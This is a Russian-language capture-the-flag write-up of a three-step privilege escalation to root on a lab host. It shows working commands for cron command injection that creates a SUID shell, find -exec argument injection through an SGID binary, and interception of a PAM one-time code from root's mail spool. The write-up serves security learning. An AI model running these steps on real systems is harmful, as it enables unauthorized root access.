От самой обычной рабочей пчелы (worker) до корневых сот (root) — три эскалации подряд, ни одной по учебнику.

хост: sotamail старт: worker, uid 1000 финиш: root цель: /root/flag.txt
worker
backupuser
group mail
root
00

Разведка

Подключаемся, смотрим, кто вообще живёт в этом улье.

На сервере два непривилегированных пользователя — worker (uid 1000) и backupuser (uid 1001). Первым делом проверяем, чем занят cron — почти всегда самое интересное лежит именно там.

worker@sotamail
$ cat /etc/cron.d/backup
* * * * * backupuser /usr/local/bin/process_backup.sh /backup/listing

Скрипт запускается каждую минуту от имени backupuser. А в директорию /backup/, включая сам listing, у worker оказался доступ на запись.

01

worker → backupuser

Командная инъекция в скрипт бэкапа, запускаемый кроном раз в минуту.

Раз файл, который кормит скрипт, доступен на запись — просто подкладываем туда команду. Дожидаемся тика крона и забираем SUID-копию shell:

worker@sotamail
$ echo '. ; cp /bin/bash /tmp/rootbash ; chmod 4755 /tmp/rootbash ; #' > /backup/listing
# ждём минуту — крон подхватит файл
$ ls -la /tmp/rootbash
-rwsr-xr-x 1 backupuser backupuser 1265648 ... /tmp/rootbash
$ /tmp/rootbash -p
$ id
uid=1000(worker) gid=1000(worker) euid=1001(backupuser)
→ получили выполнение кода от backupuser
Флаг -p обязателен: обычный bash сбрасывает привилегии, когда euid не совпадает с uid, а -p этого не делает.
02

backupuser → группа mail

Инъекция опций в find там, где инъекцию shell-символов уже отфильтровали.

Root по-прежнему недоступен. В открытой на запись директории находится SGID-бинарник delete_old_mail (группа mail), который собирает команду по шаблону:

delete_old_mail (внутри)
find /var/mail/ -type f -mtime +%s -print -delete

Фильтр внутри бинарника блокирует shell-метасимволы (;'"`\$()|<>), но не блокирует пробелы и родной синтаксис find. Значит можно не ломать shell, а просто дописать find собственные опции:

backupuser@sotamail
$ /backup/deactivated/utils/delete_old_mail "-1 -exec sh -c id {} +"
$ id
uid=1000(worker) gid=8(mail) groups=8(mail),1000(worker)
→ получили выполнение кода с группой mail

-1 заставляет -mtime +-1 совпасть вообще со всеми файлами в /var/mail/, а -exec ... {} + — это штатный синтаксис самого find, не инъекция в привычном смысле.

03

группа mail → root

Перехват одноразового кода, который PAM сам присылает root на почту.

sudo -l пуст, SUID на exim4 не даёт эффекта — привилегии дропаются, потому что группа mail не входит в trusted_groups. Зато /etc/pam.d/su вешает на вход под root кастомную 2FA:

/etc/pam.d/su
auth requisite pam_python.so /usr/local/bin/pam_otp_root.py

Модуль генерирует 9-значный код, отправляет его письмом на root и ждёт ввод с терминала. А письмо падает в /var/mail/root с правами root:mail — группе, которую мы уже получили на этапе 02.

Первая проблема: фоновые попытки (fifo, script -qc в бэкграунде) не сработали — PAM ждёт conversation именно с управляющим терминалом, а не с подменённым stdin. Прерывание через Ctrl+C тоже не подходит — оно убивает процесс вместе с его сессией ожидания кода.

Рабочий вариант — не убивать su, а поставить его на паузу сигналом SIGTSTP, освободить терминал, прочитать письмо и вернуть процесс на передний план ровно туда, где он остановился:

backupuser@sotamail — gid=mail
$ su - root &
$ SUPID=$!
$ sleep 2
$ kill -TSTP $SUPID      # пауза, а не убийство процесса
$ cat /var/mail/root      # читаем самое свежее письмо, забираем код
$ fg                       # su возвращается на тот же промпт
Введите OTP-код (прислан на почту root): <код из письма>
→ authentication successful — root

Соты вскрыты

Три независимые уязвимости подряд — command injection в cron-скрипте, argument injection в find и логическая дыра в самодельной 2FA — сложились в одну сквозную цепочку.
